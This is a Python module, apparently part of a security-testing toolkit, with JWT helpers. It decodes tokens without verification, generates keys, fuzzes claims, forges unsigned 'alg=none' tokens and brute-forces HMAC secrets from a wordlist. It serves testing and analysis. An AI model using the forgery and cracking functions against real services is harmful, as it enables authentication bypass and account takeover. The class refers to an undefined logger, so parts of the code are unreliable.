"""
Funções avançadas para parsing, criação, manipulação e fuzzing de JWTs.
"""

import jwt
import base64
import json
import logging
from termcolor import cprint
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, ec
from config.constants import JWT_ALGORITHMS
from typing import Dict, Any, Optional

logging.basicConfig(filename='logs/jwt_utils.log', level=logging.INFO, format='[%(asctime)s] %(message)s')

def decode_jwt(token: str, verify_signature=False, key=None, algorithm=None, options=None):
    try:
        opts = {"verify_signature": False}
        if options:
            opts.update(options)
        if verify_signature and key:
            return jwt.decode(token, key, algorithms=[algorithm] if algorithm else JWT_ALGORITHMS, options=opts)
        return jwt.decode(token, options=opts)
    except Exception as e:
        logging.error(f"Erro ao decodificar JWT: {e}")
        cprint(f"[x] Erro ao decodificar JWT: {e}", "red")
        return None

def extract_parts(token: str):
    try:
        header, payload, signature = token.split('.')
        def pad_b64(s):
            return s + '=' * (-len(s) % 4)
        return {
            "header": json.loads(base64.urlsafe_b64decode(pad_b64(header)).decode()),
            "payload": json.loads(base64.urlsafe_b64decode(pad_b64(payload)).decode()),
            "signature": signature
        }
    except Exception as e:
        logging.error(f"Token inválido: {e}")
        cprint(f"[x] Token inválido: {e}", "red")
        return None

def generate_token(payload: dict, secret: str, algorithm: str = "HS256", headers: dict = None):
    try:
        return jwt.encode(payload, secret, algorithm=algorithm, headers=headers)
    except Exception as e:
        logging.error(f"Erro ao gerar JWT: {e}")
        cprint(f"[x] Error generating JWT: {e}", "red")
        return None

def generate_rsa_keypair(bits=2048):
    try:
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=bits
        )
        public_key = private_key.public_key()
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return private_pem, public_pem
    except Exception as e:
        logging.error(f"Erro ao gerar par de chaves RSA: {e}")
        cprint(f"[x] Erro ao gerar par de chaves RSA: {e}", "red")
        return None, None

def generate_ec_keypair(curve=ec.SECP256K1()):
    try:
        private_key = ec.generate_private_key(curve)
        public_key = private_key.public_key()
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return private_pem, public_pem
    except Exception as e:
        logging.error(f"Erro ao gerar par de chaves EC: {e}")
        cprint(f"[x] Erro ao gerar par de chaves EC: {e}", "red")
        return None, None

def create_jwt(payload, key, algorithm='HS256', headers=None):
    try:
        if algorithm in ['RS256', 'PS256', 'ES256', 'ES384', 'ES512']:
            if isinstance(key, tuple):
                key = key[0]  # Use private key for signing
        token = jwt.encode(payload, key, algorithm=algorithm, headers=headers)
        return token
    except Exception as e:
        logging.error(f"Erro ao criar JWT: {e}")
        cprint(f"[x] Erro ao criar JWT: {e}", "red")
        return None

def fuzz_jwt_claims(token: str, claim_mutations: dict):
    """
    Gera variantes do token JWT alterando claims conforme claim_mutations.
    claim_mutations: dict {claim: [val1, val2, ...]}
    """
    try:
        parts = extract_parts(token)
        if not parts:
            return []
        header = parts["header"]
        payload = parts["payload"]
        signature = parts["signature"]
        tokens = []
        for claim, values in claim_mutations.items():
            for v in values:
                mutated_payload = payload.copy()
                mutated_payload[claim] = v
                # Recria token sem assinatura válida (alg=none) para fuzzing
                mutated_header = header.copy()
                mutated_header["alg"] = "none"
                header_b64 = base64.urlsafe_b64encode(json.dumps(mutated_header).encode()).decode().rstrip("=")
                payload_b64 = base64.urlsafe_b64encode(json.dumps(mutated_payload).encode()).decode().rstrip("=")
                tokens.append(f"{header_b64}.{payload_b64}.")
        return tokens
    except Exception as e:
        logging.error(f"Erro no fuzzing de claims JWT: {e}")
        return []

def is_jwt(token: str):
    try:
        parts = token.split('.')
        return len(parts) == 3 and all(parts)
    except Exception:
        return False

def get_jwt_alg(token: str):
    try:
        parts = extract_parts(token)
        if parts and "header" in parts:
            return parts["header"].get("alg", None)
    except Exception:
        pass
    return None

def jwt_none_attack(payload: dict, headers: dict = None):
    """
    Gera um JWT com alg=none (ataque clássico).
    """
    try:
        header = {"alg": "none", "typ": "JWT"}
        if headers:
            header.update(headers)
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        return f"{header_b64}.{payload_b64}."
    except Exception as e:
        logging.error(f"Erro no ataque alg=none: {e}")
        return None

def brute_force_jwt(token: str, wordlist: list, algorithm="HS256"):
    """
    Tenta quebrar a assinatura do JWT usando uma wordlist de segredos.
    """
    cracked = []
    for secret in wordlist:
        try:
            jwt.decode(token, secret, algorithms=[algorithm])
            cracked.append(secret)
        except Exception:
            continue
    return cracked

class JWTAnalyzer:
    """
    A class to analyze and manipulate JSON Web Tokens (JWT).
    """
    def __init__(self, token: Optional[str] = None):
        self.token = token
        logger.info("JWTAnalyzer initialized")

    def decode(self, key: Optional[str] = None, algorithms: Optional[list] = None) -> Dict[str, Any]:
        """
        Decode a JWT token.
        
        Args:
            key (str, optional): The key to decode the token.
            algorithms (list, optional): List of algorithms to try for decoding.
        
        Returns:
            dict: Decoded token data or error information.
        """
        if not self.token:
            logger.error("No token provided for decoding")
            return {"error": "No token provided"}
        
        if algorithms is None:
            algorithms = ["HS256", "HS384", "HS512"]
        
        try:
            if key:
                decoded = jwt.decode(self.token, key, algorithms=algorithms)
            else:
                decoded = jwt.decode(self.token, options={"verify_signature": False})
            logger.info("Token decoded successfully")
            return decoded
        except jwt.InvalidTokenError as e:
            logger.error(f"Invalid token: {e}")
            return {"error": str(e)}
        except Exception as e:
            logger.error(f"Error decoding token: {e}")
            return {"error": str(e)}

    def analyze(self) -> Dict[str, Any]:
        """
        Analyze the structure and potential vulnerabilities of a JWT token.
        
        Returns:
            dict: Analysis results.
        """
        if not self.token:
            logger.error("No token provided for analysis")
            return {"error": "No token provided"}
        
        try:
            header = jwt.get_unverified_header(self.token)
            payload = self.decode()
            logger.info("Token analyzed successfully")
            return {
                "header": header,
                "payload": payload,
                "potential_vulnerabilities": {
                    "weak_algorithm": header.get("alg", "").startswith("HS"),
                    "no_signature": "alg" in header and header["alg"] == "none"
                }
            }
        except Exception as e:
            logger.error(f"Error analyzing token: {e}")
            return {"error": str(e)}

    def set_token(self, token: str) -> None:
        """
        Set a new token for analysis.
        
        Args:
            token (str): The JWT token to analyze.
        """
        self.token = token
        logger.info("New token set for analysis")